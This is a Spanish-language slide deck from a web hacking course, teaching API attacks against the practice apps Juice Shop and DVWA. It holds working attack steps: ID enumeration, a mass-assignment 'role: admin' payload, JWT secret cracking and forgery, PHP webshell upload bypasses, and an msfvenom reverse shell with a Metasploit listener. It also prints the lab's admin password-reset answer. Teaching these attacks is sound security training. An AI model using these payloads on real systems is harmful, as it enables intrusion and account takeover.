# Deck 4_1 · Módulo 4 · Clase 1

---

# APIs & Explotación Avanzada
## Módulo 4 · Clase 1

> Curso de Web Hacking
> Duración: 2 horas
> Target: Juice Shop · DVWA

---

## Agenda

- **BOLA** — Broken Object Level Authorization
- **Mass Assignment** — campos que no deberías poder enviar
- **JWT attacks** — manipular tokens de autenticación
- **Business Logic** — abusar el flujo de negocio
- **API Discovery** — swagger expuesto y endpoints ocultos
- **Sensitive Data** — secrets en JS y localStorage
- **Client-side Validation Bypass** — el frontend miente
- **Password Reset débil** — OSINT + preguntas de seguridad
- **File Upload → RCE** + **Metasploit** — DVWA

**Patrón de la clase:** explicar → detectar → demo en vivo

---

## El nuevo paradigma

## Las apps modernas son APIs

- El frontend es solo una interfaz sobre una API REST o GraphQL
- La autenticación viaja en tokens JWT en el header `Authorization`
- Los datos sensibles pasan por endpoints `/api/*`
- Múltiples microservicios comunicándose entre sí

> El atacante ya no hackea "la web". Hackea la API que la alimenta.

---

## Superficie de ataque de una API

| Superficie | Qué buscar |
| --- | --- |
| Endpoints `/api/*` | IDs predecibles, falta de authz |
| Tokens JWT | Algoritmo débil, secret expuesto |
| Documentación expuesta | `/api-docs`, `/swagger.json`, `/graphql` |
| CORS | Orígenes permitidos sin validar |
| Headers de respuesta | Versiones de framework, stack info |

---

## OWASP API Security Top 10

| ID | Nombre | Descripción |
| --- | --- | --- |
| **API1** | **BOLA** | Acceder a objetos de otro usuario cambiando el ID |
| API2 | Broken Authentication | Tokens débiles, sin expiración, reutilizables |
| API3 | Broken Object Property Auth | Leer/escribir propiedades restringidas |
| API4 | Unrestricted Resource Consumption | Sin rate limiting, DDoS posible |
| API5 | Broken Function Level Auth | Llamar endpoints de admin sin serlo |
| **API6** | **Mass Assignment** | El servidor acepta campos extra del cliente |
| API7 | SSRF | El servidor hace requests internos por ti |
| **API8** | **Security Misconfiguration** | Docs expuestas, CORS abierto, headers faltantes |
| API9 | Improper Inventory Management | Versiones viejas sin dar de baja |
| API10 | Unsafe Consumption of APIs | Confiar ciegamente en APIs de terceros |

---

## API1: BOLA

---

## BOLA — qué es

## Broken Object Level Authorization

- El servidor **no verifica** si el usuario tiene permiso sobre el objeto específico
- Solo valida autenticación, no qué puede ver
- El frontend muestra "tus" recursos, pero la API acepta **cualquier ID**

**Ejemplo:** logueado como usuario 42. La API acepta `GET /api/Users/1` → datos del admin.

---

## BOLA — por qué ocurre

- El developer confía en que el cliente solo manda IDs propios
- No se valida ownership: falta `WHERE id = ? AND user_id = ?`
- Los IDs son secuenciales y predecibles (1, 2, 3...)

```
Código vulnerable:
GET /api/orders/{id}
SELECT * FROM orders WHERE id = ?

Código correcto:
SELECT * FROM orders WHERE id = ? AND user_id = currentUser
```

---

## BOLA — cómo detectarlo

1. Loguearse y capturar request con ID en Burp
2. Cambiar el ID por otro valor
3. Observar si la respuesta contiene datos de otro usuario
4. Enumerar IDs: Burp Intruder con payload numérico secuencial

**Señales de alerta:**
- IDs numéricos secuenciales en la URL
- Endpoint "mi perfil" que acepta ID externo
- UUIDs pero la API responde con cualquier UUID válido

---

## Demo — BOLA en Juice Shop

```http
POST /rest/user/login
{"email":"usuario@test.com","password":"test"}

GET /api/Users/42
Authorization: Bearer <token>

GET /api/Users/1
GET /api/Users/2
GET /api/Users/3
```

Burp Intruder: payload numérico 1 a 50 para enumerar usuarios

---

## Impacto real de BOLA

- Acceso a PII de **todos** los usuarios (emails, direcciones, órdenes)
- Escalada a objetos de admin
- Filtración masiva: una vulnerabilidad, todos los registros
- **El más prevalente en APIs:** OWASP API1 desde 2019 y 2023

> BOLA representa ~40% de los reportes de bug bounty en APIs REST.

---

## API6: Mass Assignment

---

## Mass Assignment — qué es

El servidor acepta **campos extra** en el JSON que el cliente no debería poder enviar.

```json
POST /api/Users
{
  "email": "hacker@test.com",
  "password": "test123",
  "role": "admin",
  "isAdmin": true,
  "credit": 999999
}
```

Si el framework auto-bindea el body al modelo sin filtrar → **Mass Assignment**.

---

## Mass Assignment — por qué ocurre

- Frameworks modernos auto-bindean body al modelo sin configuración explícita
- El developer no define qué campos acepta cada endpoint
- Se confía en que el frontend no va a mandar esos campos

| Framework | Auto-binding | Protección |
| --- | --- | --- |
| Node.js + Mongoose | Sí | Schema estricto |
| Ruby on Rails | Sí | Strong Params |
| Spring Boot | Sí | @JsonIgnore o DTOs |
| Laravel | Sí | $fillable o $guarded |

---

## Demo — Mass Assignment en Juice Shop

```json
POST /api/Users/
{
  "email": "pwned@test.com",
  "password": "Test1234!",
  "passwordRepeat": "Test1234!",
  "role": "admin"
}
```

Juice Shop responde con role: admin.

Login → JWT con role:admin → acceso a /#/administration

---

## Defensa: DTOs y Allowlist

```javascript
// Vulnerable
const user = await User.create(req.body);

// Seguro
const { email, password } = req.body;
const user = await User.create({
  email,
  password,
  role: 'customer'  // definido por el servidor
});
```

Regla: nunca dejar que el cliente defina su propio rol, precio o permisos.

---

## JWT: Broken Authentication

---

## JWT — estructura

```
Header.Payload.Signature

Header: {"alg":"HS256","typ":"JWT"}
Payload: {"email":"user@test.com","role":"customer","exp":...}
Signature: HMAC-SHA256(header+payload, secret)
```

| Parte | Riesgo |
| --- | --- |
| Header alg | Cambiar a "none" = sin firma |
| Payload role | Modificable si no se valida la firma |
| Secret débil | Crackeable con hashcat en segundos |

Herramienta: jwt.io — decodea sin necesitar el secret

---

## JWT — ataques comunes

- **Algorithm None:** cambiar alg a none + eliminar la firma
- **Weak Secret:** si el secret es "secret" o "123456" → crackeable
- **RS256 → HS256 confusion:** usar public key como secret HMAC
- **Expiración ignorada:** reutilizar tokens vencidos

```bash
# Brute force del JWT secret
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py <token> -T
python3 jwt_tool.py <token> -X a
python3 jwt_tool.py <token> -C -d rockyou.txt
```

---

## Demo — JWT en Juice Shop

```
1. Login → copiar JWT del header Authorization

2. Decodear en jwt.io:
   Payload: {"email":"user@test.com","role":"customer"}

3. Buscar el secret:
   DevTools → Sources → Ctrl+F "secret"
   Juice Shop usa: "secret" como JWT secret

4. En jwt.io:
   → Cambiar role a "admin"
   → Pegar el secret
   → Copiar el nuevo token

5. Usar en Burp → acceso completo como admin
```

---

## File Upload → RCE

---

## File Upload — la vulnerabilidad

Subir archivos sin validar tipo y contenido puede llevar a **Remote Code Execution**.

Flujo del ataque:
1. Encontrar formulario de upload
2. Subir archivo .php malicioso
3. Si el servidor guarda en directorio web → RCE

```
http://victim/uploads/shell.php?cmd=whoami
http://victim/uploads/shell.php?cmd=id
```

---

## Bypasses de File Upload

| Técnica | Cómo | Cuándo funciona |
| --- | --- | --- |
| Extensión alternativa | .php5, .phtml | Solo valida extensión |
| MIME spoofing | Content-Type: image/jpeg | Solo valida MIME |
| Magic bytes | GIF89a; al inicio | Valida magic bytes |
| Null byte | shell.php%00.jpg | Lenguajes con null byte |
| Double extension | shell.jpg.php | Mala config Apache |

---

## Demo — File Upload en DVWA

```
Nivel Low:
→ Subir shell.php directamente
→ /hackable/uploads/shell.php?cmd=id

Nivel Medium (valida Content-Type):
→ Burp: cambiar Content-Type: image/jpeg

Nivel High (extensión + magic bytes):
→ Renombrar a shell.php5
→ Agregar GIF89a; al inicio del PHP
```

Target: https://dvwa.labs.manuel-roldan.cloud

---

## Metasploit para Web

---

## Metasploit — módulos web útiles

| Módulo | Función |
| --- | --- |
| `exploit/multi/handler` | Recibir reverse shell |
| `auxiliary/scanner/http/sql_injection` | Detectar SQLi |
| `auxiliary/scanner/http/brute_dirs` | Enumerar directorios |
| `exploit/.../wordpress_admin_shell_upload` | RCE en WordPress |

**auxiliary** = detecta sin explotar
**exploit** = explota activamente

---

## Demo — Reverse Shell con msfvenom

```bash
# 1. Generar payload PHP
msfvenom -p php/reverse_php LHOST=<ip-kali> LPORT=4444 -f raw > revshell.php

# 2. Subir via DVWA File Upload (nivel Low)

# 3. Listener en Metasploit
msfconsole
use exploit/multi/handler
set payload php/reverse_php
set LHOST <ip-kali>
set LPORT 4444
run

# 4. Activar el payload
curl https://dvwa.labs.../hackable/uploads/revshell.php
```

---

## Módulos auxiliares útiles

```bash
use auxiliary/scanner/http/sql_injection
set RHOSTS target.com
set TARGETURI /app.php?id=1
run

use auxiliary/scanner/http/brute_dirs
set RHOSTS target.com
run

use auxiliary/scanner/http/wordpress_scanner
set RHOSTS target.com
run
```

---

## Business Logic Abuse

---

## Business Logic — qué es

No es un bug de código. Es **usar la app como fue diseñada, pero de forma no intencionada**.

```
Casos clásicos en Juice Shop:
- Precio negativo en el carrito → descuento infinito
- Descuentos acumulables
- Comprar productos que no existen
- Cambiar BasketId para usar el carrito de otro usuario
```

| Categoría | OWASP API |
| --- | --- |
| Flujo de negocio no restringido | API6: Unrestricted Access to Sensitive Business Flows |
| BOLA en basket | API1: BOLA |

---

## Demo — Business Logic en Juice Shop

```http
# Precio negativo — modificar request en Burp
PUT /api/BasketItems/7
{"quantity":-100}
→ Total del carrito: -$500 (cobro negativo)

# Cambiar BasketId de otro usuario (BOLA)
GET /rest/basket/1
GET /rest/basket/2
Authorization: Bearer <tu-token>
→ Ver carrito de otro usuario
```

Intruder: iterar BasketId del 1 al 20 para ver todos los carritos

---

## API Discovery

---

## API Discovery — la API te lo cuenta todo

Antes de atacar, **mapear** qué endpoints existen.

```
En Juice Shop → DevTools → Network
→ Filtrar por XHR / Fetch
→ Ver todas las llamadas a /api/* y /rest/*

Endpoints interesantes encontrados:
  GET  /api/Users/        ← lista todos los usuarios (admin)
  GET  /api/Products/     ← catálogo completo
  POST /api/Orders/       ← crear orden
  GET  /api-docs          ← ¡Swagger/OpenAPI expuesto!
```

---

## Demo — Swagger expuesto en Juice Shop

```
1. Abrir: https://juice.labs.../api-docs

2. Ver TODOS los endpoints documentados
   → Algunos no están enlazados en la UI
   → Incluye parámetros y formatos esperados

3. Buscar endpoints "admin only" sin protección:
   DELETE /api/Users/:id
   GET /api/Users/ (lista completa)

4. Intentar directamente desde Swagger UI
   o copiar el curl → Burp → manipular
```

> Si hay documentación de API expuesta en producción = regalo para el atacante.

---

## Sensitive Data Exposure

---

## Sensitive Data — lo que no debería estar ahí

Los atacantes buscan secrets **antes de explotar** cualquier cosa.

```
Dónde mirar en Juice Shop:

DevTools → Sources → buscar en JS bundles:
  - Contraseñas hardcodeadas
  - API keys
  - JWT secrets
  - URLs internas

DevTools → Application → Local Storage:
  - Token JWT guardado en localStorage (XSS lo roba fácil)
  - Datos de usuario serializados
```

---

## Demo — Secrets en JS de Juice Shop

```
1. DevTools → Sources → main.js (bundle Angular)
   Ctrl+F: "password"  → encuentra credenciales hardcodeadas
   Ctrl+F: "secret"    → encuentra JWT secret ("secret")
   Ctrl+F: "token"     → encuentra cómo se guarda el auth

2. Application → Local Storage → localhost
   → Ver token JWT completo
   → Copiarlo y decodear en jwt.io

3. Network → buscar headers de respuesta:
   X-Powered-By: Express   ← framework expuesto
   Server: nginx/1.14      ← versión expuesta (CVE searchable)
```

**Takeaway:** el frontend Angular compila todo el código cliente. El atacante lo lee.

---

## Client-side Validation Bypass

---

## Bypass — el frontend miente

Las validaciones del lado del cliente (HTML5, JavaScript) son **solo UX, no seguridad**.

```
Ejemplo: cantidad mínima de 1 en el carrito
→ El frontend no deja escribir 0 o negativo
→ Pero si capturas el request en Burp...
```

```http
PUT /api/BasketItems/7
{"quantity":-100}
```

El servidor no valida → acepta el cambio.

**Regla de oro:** toda validación del cliente debe replicarse en el servidor.

---

## Demo — Client-side Validation en Juice Shop

```
1. Agregar producto al carrito en la UI

2. Burp → Intercept ON

3. Cambiar cantidad a -100 en el request:
   {"quantity": -100}

4. Forward → el carrito ahora tiene precio negativo

5. También: cambiar productId por uno inexistente
   → Ver qué responde el servidor
```

**También aplica a:**
- Campos de formulario `maxlength` o `disabled`
- Filtros de tipo de archivo en inputs
- Lógica de precios/descuentos calculada solo en el frontend

---

## Password Reset débil

---

## Password Reset — autenticación que se puede bypassear

Juice Shop usa **preguntas de seguridad** cuyas respuestas son obtenibles por OSINT.

```
Flujo vulnerable:
1. Ir a Forgot Password
2. Ingresar email de la víctima (visible en reseñas, perfil público)
3. Responder pregunta de seguridad
4. Cambiar contraseña sin verificación extra
```

Los usuarios de Juice Shop tienen preguntas como:
- "¿Nombre de tu primera mascota?"
- "¿Ciudad donde naciste?"

**Si el email es real → las respuestas están en redes sociales.**

---

## Demo — Password Reset en Juice Shop

```
Target: admin@juice-sh.op

1. Ir a /#/forgot-password
2. Email: admin@juice-sh.op
3. Pregunta: "What is your mother maiden name?"
4. Respuesta: "Simpson" (lore del personaje en el código fuente)

Target: jim@juice-sh.op
Pregunta: "What is your favorite movie?"
Respuesta: "Star Wars" (nombre de usuario = Jim → referencia Star Trek)

→ Cambiar contraseña del admin sin saber la original
```

**OWASP API2 — Broken Authentication:** el mecanismo de recuperación es parte del flujo de autenticación.


## Resumen de lo aprendido

- **BOLA:** cambiar IDs en la URL accede a recursos de otros usuarios
- **Mass Assignment:** enviar `role:admin` en el JSON para escalar privilegios
- **JWT:** algorithm none, weak secret, modificar payload con secret conocido
- **Business Logic:** precios negativos, BOLA en carrito, flujos no restringidos
- **API Discovery:** Swagger expuesto = mapa de todos los endpoints
- **Sensitive Data:** secrets hardcodeados en JS bundle, JWT en localStorage
- **Validation Bypass:** el frontend bloquea, el servidor no valida
- **Password Reset:** OSINT + preguntas débiles → cambio de contraseña sin auth
- **File Upload + Metasploit:** RCE via webshell PHP

**Las APIs confían demasiado en el cliente. El cliente siempre puede mentir.**

---

## Próxima clase

## Módulo 5 — Defensa & Hardening

- HTTP Security Headers (CSP, HSTS, X-Frame-Options)
- Cookies seguras (HttpOnly, Secure, SameSite)
- Validación server-side y Prepared Statements
- WAF + Rate Limiting
- Checklist final del desarrollador seguro

**La última clase cierra el ciclo: de atacar a defender.**

---

## Gracias

**¿Preguntas?**

La API nunca miente — el frontend sí.

Practiquen BOLA y Mass Assignment en Juice Shop, File Upload en DVWA.

Nos vemos en el cierre del curso 🚀